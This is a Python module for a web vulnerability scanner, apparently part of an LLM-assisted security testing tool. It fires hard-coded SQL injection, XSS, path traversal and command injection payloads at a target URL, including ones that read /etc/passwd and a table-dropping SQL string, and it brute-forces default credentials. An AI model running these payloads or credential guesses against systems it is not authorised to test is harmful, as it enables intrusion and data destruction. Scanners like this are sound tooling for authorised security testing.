"""
Vulnerability Scanner Module - Automated vulnerability detection and analysis
"""
import requests
import re
import json
import asyncio
import aiohttp
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from typing import Dict, List, Optional
import sqlparse
from core.llm_interface import LLMInterface
from config import Config

class VulnerabilityScanner:
    def __init__(self):
        self.llm = LLMInterface()
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def sql_injection_test(self, url: str, params: Dict = None) -> Dict:
        """Test for SQL injection vulnerabilities"""
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'x'='x",
            "1' OR '1'='1' /*",
            "admin'--",
            "' OR 1=1#"
        ]
        
        vulnerabilities = []
        
        for payload in sql_payloads:
            try:
                if params:
                    test_params = params.copy()
                    for key in test_params:
                        test_params[key] = payload
                    response = self.session.get(url, params=test_params, timeout=10)
                else:
                    test_url = f"{url}?id={payload}"
                    response = self.session.get(test_url, timeout=10)
                
                # Check for SQL error messages
                error_patterns = [
                    r"SQL syntax.*MySQL",
                    r"Warning.*mysql_.*",
                    r"valid MySQL result",
                    r"PostgreSQL.*ERROR",
                    r"Warning.*pg_.*",
                    r"valid PostgreSQL result",
                    r"ORA-[0-9]+",
                    r"Oracle error",
                    r"Microsoft.*ODBC.*SQL Server",
                    r"SQLServer JDBC Driver"
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'payload': payload,
                            'url': response.url,
                            'evidence': pattern,
                            'severity': 'High'
                        })
                        break
                        
            except Exception as e:
                continue
        
        return {'vulnerabilities': vulnerabilities}
    
    def xss_test(self, url: str, forms: List[Dict] = None) -> Dict:
        """Test for Cross-Site Scripting vulnerabilities"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<<SCRIPT>alert('XSS')//<</SCRIPT>"
        ]
        
        vulnerabilities = []
        
        # Test URL parameters
        for payload in xss_payloads:
            try:
                test_url = f"{url}?search={payload}"
                response = self.session.get(test_url, timeout=10)
                
                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'Reflected XSS',
                        'payload': payload,
                        'url': test_url,
                        'evidence': 'Payload reflected in response',
                        'severity': 'High'
                    })
            except Exception as e:
                continue
        
        # Test forms if provided
        if forms:
            for form in forms:
                for payload in xss_payloads:
                    try:
                        form_data = {}
                        for input_field in form.get('inputs', []):
                            field_name = input_field.get('name', '')
                            if field_name:
                                form_data[field_name] = payload
                        
                        action_url = urljoin(url, form.get('action', ''))
                        method = form.get('method', 'GET').upper()
                        
                        if method == 'POST':
                            response = self.session.post(action_url, data=form_data, timeout=10)
                        else:
                            response = self.session.get(action_url, params=form_data, timeout=10)
                        
                        if payload in response.text:
                            vulnerabilities.append({
                                'type': 'Stored/Reflected XSS',
                                'payload': payload,
                                'url': action_url,
                                'form': form,
                                'evidence': 'Payload reflected in form response',
                                'severity': 'High'
                            })
                    except Exception as e:
                        continue
        
        return {'vulnerabilities': vulnerabilities}
    
    def directory_traversal_test(self, url: str) -> Dict:
        """Test for directory traversal vulnerabilities"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\etc\\\\passwd"
        ]
        
        vulnerabilities = []
        
        for payload in traversal_payloads:
            try:
                test_url = f"{url}?file={payload}"
                response = self.session.get(test_url, timeout=10)
                
                # Check for Unix/Linux system files
                if re.search(r"root:.*:0:0:", response.text):
                    vulnerabilities.append({
                        'type': 'Directory Traversal',
                        'payload': payload,
                        'url': test_url,
                        'evidence': '/etc/passwd content detected',
                        'severity': 'High'
                    })
                
                # Check for Windows system files
                elif re.search(r"# Copyright.*Microsoft Corp", response.text):
                    vulnerabilities.append({
                        'type': 'Directory Traversal',
                        'payload': payload,
                        'url': test_url,
                        'evidence': 'Windows hosts file detected',
                        'severity': 'High'
                    })
                    
            except Exception as e:
                continue
        
        return {'vulnerabilities': vulnerabilities}
    
    def command_injection_test(self, url: str, params: Dict = None) -> Dict:
        """Test for command injection vulnerabilities"""
        command_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "; ping -c 4 127.0.0.1",
            "& dir",
            "| dir"
        ]
        
        vulnerabilities = []
        
        for payload in command_payloads:
            try:
                if params:
                    test_params = params.copy()
                    for key in test_params:
                        test_params[key] = f"test{payload}"
                    response = self.session.get(url, params=test_params, timeout=15)
                else:
                    test_url = f"{url}?cmd=test{payload}"
                    response = self.session.get(test_url, timeout=15)
                
                # Check for command execution indicators
                indicators = [
                    r"root:.*:0:0:",  # /etc/passwd
                    r"uid=\d+.*gid=\d+",  # whoami output
                    r"PING.*bytes of data",  # ping output
                    r"Directory of",  # Windows dir
                    r"total \d+",  # ls -la output
                ]
                
                for indicator in indicators:
                    if re.search(indicator, response.text):
                        vulnerabilities.append({
                            'type': 'Command Injection',
                            'payload': payload,
                            'url': response.url,
                            'evidence': indicator,
                            'severity': 'Critical'
                        })
                        break
                        
            except Exception as e:
                continue
        
        return {'vulnerabilities': vulnerabilities}
    
    def weak_authentication_test(self, login_url: str) -> Dict:
        """Test for weak authentication mechanisms"""
        common_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('user', 'user'),
            ('admin', ''),
            ('', 'admin')
        ]
        
        vulnerabilities = []
        
        for username, password in common_credentials:
            try:
                login_data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'login': username,
                    'passwd': password
                }
                
                response = self.session.post(login_url, data=login_data, timeout=10)
                
                # Check for successful login indicators
                success_indicators = [
                    'dashboard',
                    'welcome',
                    'logout',
                    'profile',
                    'settings'
                ]
                
                failure_indicators = [
                    'invalid',
                    'incorrect',
                    'failed',
                    'error',
                    'wrong'
                ]
                
                response_lower = response.text.lower()
                
                has_success = any(indicator in response_lower for indicator in success_indicators)
                has_failure = any(indicator in response_lower for indicator in failure_indicators)
                
                if has_success and not has_failure:
                    vulnerabilities.append({
                        'type': 'Weak Authentication',
                        'credentials': f"{username}:{password}",
                        'url': login_url,
                        'evidence': 'Successful login with weak credentials',
                        'severity': 'High'
                    })
                    
            except Exception as e:
                continue
        
        return {'vulnerabilities': vulnerabilities}
    
    async def comprehensive_scan(self, target_url: str, forms: List[Dict] = None) -> Dict:
        """Perform comprehensive vulnerability scanning"""
        print(f"[+] Starting vulnerability scan on {target_url}")
        
        results = {
            'target': target_url,
            'timestamp': asyncio.get_event_loop().time(),
            'vulnerabilities': [],
            'scan_results': {},
            'llm_analysis': ""
        }
        
        # SQL Injection testing
        print("[+] Testing for SQL Injection...")
        sql_results = self.sql_injection_test(target_url)
        results['scan_results']['sql_injection'] = sql_results
        results['vulnerabilities'].extend(sql_results['vulnerabilities'])
        
        # XSS testing
        print("[+] Testing for Cross-Site Scripting...")
        xss_results = self.xss_test(target_url, forms)
        results['scan_results']['xss'] = xss_results
        results['vulnerabilities'].extend(xss_results['vulnerabilities'])
        
        # Directory Traversal testing
        print("[+] Testing for Directory Traversal...")
        traversal_results = self.directory_traversal_test(target_url)
        results['scan_results']['directory_traversal'] = traversal_results
        results['vulnerabilities'].extend(traversal_results['vulnerabilities'])
        
        # Command Injection testing
        print("[+] Testing for Command Injection...")
        command_results = self.command_injection_test(target_url)
        results['scan_results']['command_injection'] = command_results
        results['vulnerabilities'].extend(command_results['vulnerabilities'])
        
        # Weak Authentication testing (if login page detected)
        if 'login' in target_url.lower() or any('password' in str(form) for form in (forms or [])):
            print("[+] Testing for Weak Authentication...")
            auth_results = self.weak_authentication_test(target_url)
            results['scan_results']['weak_authentication'] = auth_results
            results['vulnerabilities'].extend(auth_results['vulnerabilities'])
        
        # LLM analysis of vulnerabilities
        if results['vulnerabilities']:
            print("[+] Analyzing vulnerabilities with LLM...")
            results['llm_analysis'] = self.llm.analyze_vulnerability(results)
        
        return results
